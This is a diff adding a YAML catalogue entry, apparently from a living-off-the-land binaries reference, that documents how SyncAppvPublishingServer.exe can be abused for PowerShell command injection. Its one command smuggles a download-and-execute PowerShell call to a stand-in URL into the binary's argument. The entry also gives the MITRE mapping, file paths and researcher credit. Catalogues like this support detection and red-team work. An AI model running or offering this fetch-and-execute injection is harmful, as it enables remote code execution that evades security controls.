@@ -1,0 +1,36 @@
+---
+Name: 'Syncappvpublishingserver.exe'
+Description: 'Powershell command injection'
+Created: '2018-07-31'
+Commands:
+  - Command: 'SyncAppvPublishingServer.exe "n;((New-Object Net.WebClient).DownloadString("http://some.url/script.ps1") | IEX'
+    Description: 'Execute powershell code from URL'
+Windows Binary: true
+Bypasses Default AppLocker Rules: false
+Notes: 'SyncAppvPublishingServer.exe command inject has been fixed in newer versions of Windows 10. Works as of 10.0.16299.371'
+MITRE:
+  - ID: 'T1218'
+    Link: 'https://attack.mitre.org/wiki/Technique/T1218'
+Atomic Red Teaming:
+  - Description: ''
+    Code: ''    
+Full path:
+  - Path: 'C:\Windows\System32\Syncappvpublishingserver.exe'
+  - Path: 'C:\Windows\SysWOW64\Syncappvpublishingserver.exe'
+Verified on OS:
+  - Windows 10 1803: false
+  - Windows 10 1709: false
+  - Windows 10 1703: false
+  - Windows 10 1607: false
+  - Windows 10 1511: false
+  - Windows 10 1507: false
+  - Windows 8.1: false
+  - Windows 8: false
+  - Windows 7: false
+Resources:
+  - Link: 'https://twitter.com/monoxgas/status/895045566090010624'
+Acknowledgement:
+  - Name: 'Nick Landers'
+    TwitterHandle: '@monoxgas'
+    Blog: ''
+---
